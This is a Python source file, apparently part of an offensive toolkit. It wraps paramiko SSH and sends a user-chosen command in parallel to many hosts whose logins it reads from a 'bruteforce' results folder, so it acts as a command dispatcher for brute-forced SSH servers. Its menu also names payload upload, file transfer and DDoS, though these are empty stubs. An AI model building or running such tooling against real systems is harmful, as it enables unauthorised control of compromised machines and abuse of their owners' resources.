# -*- coding: utf-8 -*-
import threading

import paramiko

from paramiko.ssh_exception import NoValidConnectionsError

from libs import uix
from libs import utils
from libs import decorators


class SSH(object):
    def __init__(self, **kwargs):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        self.kwargs = kwargs
        self.error = None

    def __enter__(self):
        kw = self.kwargs

        try:
            self.client.connect(hostname=kw.get('hostname'), username=kw.get('username'),
                                password=kw.get('password'), port=kw.get('port', '22'))
        except NoValidConnectionsError as e:
            self.error = str(e)

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.client.close()

    def exec_cmd(self, cmd):
        try:
            _, stdout, _ = self.client.exec_command(cmd)
        except AttributeError:
            return self.error

        data = stdout.read().decode()

        return data

    def transmit_file(self, local, remote):
        sftp = self.client.open_sftp()
        sftp.put(local, remote)
        sftp.close()

    def download_file(self, local, remote):
        sftp = self.client.open_sftp()
        sftp.get(remote, local)
        sftp.close()


class SendCommand(object):
    def __init__(self):
        self.sub_menu = {
            '0': self.send_custom_command,
            '1': self.upload_payload,
            '2': self.download_file,
            '3': self.upload_file,
            '4': self.ddos,
        }
        self.brute_dir = utils.get_path_to_dir('bruteforce')
        self.sendcmd_dir = utils.get_path_to_dir('sendcommand')
        self.hosts_dirs = utils.show_results_files('bruteforce', '22_')
        self.cmd = None
        self.log = 'N'

    @decorators.ssh_send_cmd_out
    def exec_custom_cmd(self, seq, cmd, log='N'):
        for el in list(seq):
            with SSH(**el) as ssh:
                output = ssh.exec_cmd(cmd)

            file = self.sendcmd_dir + '/exec_custom_cmd.json'

            yield output, file, cmd, el['hostname'], log.lower()

    def exec_custom_cmd_by_range(self, file, range_, cmd_name, log, lock):
        self.exec_custom_cmd(utils.create_dict_data(utils.read_file_from_specific_line(file, range_, lock)),
                             cmd_name, log)

    def send_custom_command(self):
        choice, cmd, log = uix.send_command_custom_cmd(self.hosts_dirs)
        file = utils.get_file_from_dir(self.brute_dir, self.hosts_dirs, choice, 'filtered_result')
        lines_amount = utils.count_lines(file)

        # Exec cmd reading file by blocks.
        block_size = 100
        num_threads = 10
        begin = 0
        end = begin + block_size if lines_amount < block_size else lines_amount
        ranges = utils.split_on_ranges_by_step(begin, end, num_threads)

        while lines_amount != 0:
            threads = []
            lock = threading.Lock()

            for range_ in ranges:
                threads.append(threading.Thread(target=self.exec_custom_cmd_by_range,
                                                args=(file, range_, cmd, log, lock)))
            [t.start() for t in threads]
            [t.join() for t in threads]

            begin += block_size
            end = begin + block_size
            lines_amount -= block_size if lines_amount > block_size else lines_amount
            ranges = ranges if lines_amount > block_size else utils.split_on_ranges_by_step(begin, end, num_threads)

    def upload_payload(self):
        pass

    def download_file(self):
        pass

    def upload_file(self):
        pass

    def ddos(self):
        pass

    def run(self):
        import time
        start_time = time.time()
        choice = uix.send_command_start_msg()
        self.sub_menu[choice]()
        print("--- %s seconds ---" % (time.time() - start_time))

